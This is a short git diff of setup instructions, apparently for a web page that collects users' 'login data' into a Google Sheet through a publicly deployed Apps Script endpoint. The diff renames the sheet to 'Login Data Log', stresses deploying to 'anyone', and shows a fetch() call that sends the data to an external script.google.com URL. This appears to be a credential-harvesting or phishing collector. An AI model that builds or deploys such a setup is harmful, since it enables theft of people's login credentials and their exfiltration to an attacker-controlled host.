@@ -4,7 +4,7 @@ collecting data of the user to an google sheet (you can change it to anything el
 
 at line 26, edit the link
 
-1. create a google sheet
+1. create a google sheet (name something like "Login Data Log")
 2. in extensions > appscript
 3. (javascript) replace all with:
 
@@ -20,7 +20,7 @@ at line 26, edit the link
 } 
 </pre>
 
-4. deploy [select anyone !important!]
+4. deploy [select "anyone" !important!]
 5. copy link
 6. replace it on line 26
     fetch("https://script.google.com/macros/s/AKfycby69FXNkbhLcd5sKXqb2MhQIDDH6GBLIhhCNbdYREEFDBRbHg7lQeMLDHNz1d20LR-b/exec", {
